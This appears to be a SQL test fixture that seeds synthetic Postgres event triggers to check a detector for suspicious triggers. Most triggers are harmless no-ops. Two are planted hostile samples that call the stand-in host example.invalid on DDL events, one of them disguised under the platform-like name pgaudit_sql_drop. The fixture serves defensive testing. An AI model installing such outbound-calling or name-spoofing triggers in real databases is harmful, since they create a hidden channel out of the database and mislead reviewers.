-- REHEARSAL - NEVER MERGE. Synthetic event triggers for S0B-DIAG: six platform-style triggers (usual names, functions owned by a supabase_admin-like
-- role), an ensure_rls -> public.rls_auto_enable() look-alike owned by postgres, a hostile one that calls net.http_post under a non-platform name, and a
-- spoof that carries a usual platform name (pgaudit_sql_drop) but whose function calls http_get. Function bodies are synthetic; no real URL.
create role supabase_admin superuser nologin;
create schema if not exists extensions;
create function extensions.rh_noop() returns event_trigger language plpgsql as $f$ begin null; end $f$;
alter function extensions.rh_noop() owner to supabase_admin;
create function extensions.rh_noop2() returns event_trigger language plpgsql as $f$ begin null; end $f$;
alter function extensions.rh_noop2() owner to supabase_admin;
create event trigger pgrst_ddl_watch on ddl_command_end execute function extensions.rh_noop();
create event trigger pgrst_drop_watch on sql_drop execute function extensions.rh_noop();
create event trigger issue_graphql_placeholder on sql_drop when tag in ('DROP EXTENSION') execute function extensions.rh_noop2();
create event trigger issue_pg_graphql_access on ddl_command_end when tag in ('CREATE FUNCTION') execute function extensions.rh_noop2();
create event trigger issue_pg_cron_access on ddl_command_end when tag in ('CREATE EXTENSION') execute function extensions.rh_noop2();
create event trigger issue_pg_net_access on ddl_command_end when tag in ('CREATE EXTENSION') execute function extensions.rh_noop2();
alter event trigger pgrst_ddl_watch owner to supabase_admin;
alter event trigger pgrst_drop_watch owner to supabase_admin;
alter event trigger issue_graphql_placeholder owner to supabase_admin;
alter event trigger issue_pg_graphql_access owner to supabase_admin;
alter event trigger issue_pg_cron_access owner to supabase_admin;
alter event trigger issue_pg_net_access owner to supabase_admin;
-- the documented look-alike: owner postgres, three tags, builds an ALTER TABLE ... ENABLE ROW LEVEL SECURITY statement dynamically
create function public.rls_auto_enable() returns event_trigger language plpgsql security definer set search_path = pg_catalog as $f$
declare cmd record;
begin
  for cmd in select * from pg_event_trigger_ddl_commands() where command_tag in ('CREATE TABLE') and schema_name = 'public' loop
    execute format('alter table if exists %s enable row level security', cmd.object_identity);
  end loop;
end $f$;
create event trigger ensure_rls on ddl_command_end when tag in ('CREATE TABLE', 'CREATE TABLE AS', 'SELECT INTO') execute function public.rls_auto_enable();
-- hostile: a non-platform name, calls out (upper case on purpose: the match is case-insensitive), disabled
create function public.rh_hostile() returns event_trigger language plpgsql as $f$ begin perform NET.HTTP_POST(url := 'https://example.invalid/x'); end $f$;
create event trigger zz_hostile_notify on ddl_command_end execute function public.rh_hostile();
alter event trigger zz_hostile_notify disable;
-- spoof: carries a usual platform name, owned by postgres, calls out
create function public.rh_spoof() returns event_trigger language plpgsql as $f$ begin perform http_get('https://example.invalid/y'); end $f$;
create event trigger pgaudit_sql_drop on sql_drop execute function public.rh_spoof();
